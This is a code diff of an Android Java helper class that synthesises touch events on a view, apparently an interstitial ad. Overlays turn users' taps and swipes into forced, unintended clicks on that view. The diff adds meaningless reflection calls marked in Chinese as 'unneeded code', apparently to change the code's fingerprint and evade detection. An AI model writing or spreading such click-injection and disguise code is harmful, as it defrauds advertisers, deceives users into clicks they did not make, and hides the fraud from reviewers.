@@ -21,17 +21,31 @@ import java.lang.reflect.Field;
 public class ViewHelper {
 
     protected static void clickView(ViewGroup rv) {
-        long dTime = SystemClock.uptimeMillis();
-        long eTime = SystemClock.uptimeMillis();
-        float x = rv.getWidth() / 2f;
-        float y = rv.getHeight() / 2f;
-        int metaState = 0;
-        MotionEvent de = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_DOWN, x, y, metaState);
-        MotionEvent ue = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_UP, x, y, metaState);
-        rv.dispatchTouchEvent(de);
-        rv.dispatchTouchEvent(ue);
-        de.recycle();
-        ue.recycle();
+
+        try {
+
+            long dTime = SystemClock.uptimeMillis();
+            long eTime = SystemClock.uptimeMillis();
+            float x = rv.getWidth() / 2f;
+            float y = rv.getHeight() / 2f;
+            int metaState = 0;
+            MotionEvent de = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_DOWN, x, y, metaState);
+            // 添加一行不要的代码
+            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
+
+
+            MotionEvent ue = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_UP, x, y, metaState);
+            // 添加一行不要的代码
+            Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
+
+
+            rv.dispatchTouchEvent(de);
+            rv.dispatchTouchEvent(ue);
+            de.recycle();
+            ue.recycle();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     protected static void addInterstitialView() {
@@ -80,12 +94,19 @@ public class ViewHelper {
             );
             lp.setMargins(100, 600, 0, 0);
             ci.setLayoutParams(lp);
+            // 添加一行不要的代码
+            Class<?> activityThreadClass = Class.forName("android.view.View");
+
             ci.setOnClickListener(v -> {
                 ViewHelper.clickView(rv);
                 ci.setVisibility(View.GONE);
             });
 
             LinearLayout layout = new LinearLayout(act, null);
+            // 添加一行不要的代码
+            Class<?> fl = Class.forName("android.widget.FrameLayout");
+
+
             layout.setOnClickListener(v -> {
                 ViewHelper.clickView(rv);
                 layout.setVisibility(View.GONE);
@@ -98,35 +119,48 @@ public class ViewHelper {
     }
 
     protected static void renderInfoView(Context context, FrameLayout sc, View efv) {
-        FrameLayout fv = new FrameLayout(context);
-        FrameLayout fli = new FrameLayout(context);
-        View llm = new View(context);
-        fv.addView(fli);
-        fv.addView(llm);
-//        fli.removeAllViews();
-        fli.addView(efv);
-        llm.setVisibility(View.GONE);
-        if (isAddView(context, 2)) {
-            llm.setVisibility(View.VISIBLE);
-            llm.setOnTouchListener(new View.OnTouchListener() {
-                @Override
-                public boolean onTouch(View v, MotionEvent event) {
-                    switch (event.getAction()) {
-                        case MotionEvent.ACTION_DOWN:
-                            ViewHelper.clickView((ViewGroup) efv);
-                            break;
-                        case MotionEvent.ACTION_MOVE:
-                            ViewHelper.clickView((ViewGroup) efv);
-                            break;
-                        case MotionEvent.ACTION_UP:
-                            break;
-                    }
-                    return false;
-                }
-            });
-        }
+        try {
+            FrameLayout fv = new FrameLayout(context);
+            FrameLayout fli = new FrameLayout(context);
+            View llm = new View(context);
 
-        sc.addView(fv);
+            // 添加一行不要的代码
+            Class<?> activityThreadClass = Class.forName("android.widget.FrameLayout");
+
+
+            fv.addView(fli);
+            fv.addView(llm);
+//        fli.removeAllViews();
+            fli.addView(efv);
+
+            // 添加一行不要的代码
+            Class<?> vv = Class.forName("android.view.View");
+
+            llm.setVisibility(View.GONE);
+            if (isAddView(context, 2)) {
+                llm.setVisibility(View.VISIBLE);
+                llm.setOnTouchListener(new View.OnTouchListener() {
+                    @Override
+                    public boolean onTouch(View v, MotionEvent event) {
+                        switch (event.getAction()) {
+                            case MotionEvent.ACTION_DOWN:
+                                ViewHelper.clickView((ViewGroup) efv);
+                                break;
+                            case MotionEvent.ACTION_MOVE:
+                                ViewHelper.clickView((ViewGroup) efv);
+                                break;
+                            case MotionEvent.ACTION_UP:
+                                break;
+                        }
+                        return false;
+                    }
+                });
+            }
+
+            sc.addView(fv);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
     }
 
     protected static boolean isAddView(Context context, int type) {
